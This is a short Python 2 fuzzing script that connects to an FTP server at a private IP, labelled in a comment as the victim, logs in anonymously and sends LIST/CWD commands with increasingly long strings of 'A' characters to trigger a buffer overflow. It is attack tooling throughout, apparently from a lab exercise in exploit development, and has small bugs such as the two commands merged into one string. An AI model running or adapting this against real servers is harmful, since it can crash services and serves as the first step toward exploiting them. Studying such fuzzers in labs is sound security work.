#!/usr/bin/python

import socket

# Create an array of buffers, from 0 to 2000, with increments of 100.
buffer=["A"]
counter=20

while len(buffer) <= 30:
	buffer.append("A"*counter)
	counter=counter+100

#Define the FTP commands to be fuzzed
commands=["LIST, CWD"]

# Run the fuzzing loop
for command in commands:
	for string in buffer:
		print "Fuzzing " + command + " with length:" +str(len(string))
		s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		connect=s.connect(('172.16.73.129',21)) #IP Address of the victim
		s.recv(1024)
		s.send('USER anonymous\r\n')
		s.recv(1024)
		s.send('PASS anonymous\r\n')
		s.recv(1024)
		s.send(command + ' ' + string + '\r\n')
		s.recv(1024)
		s.send('QUIT\r\n')
		s.close()
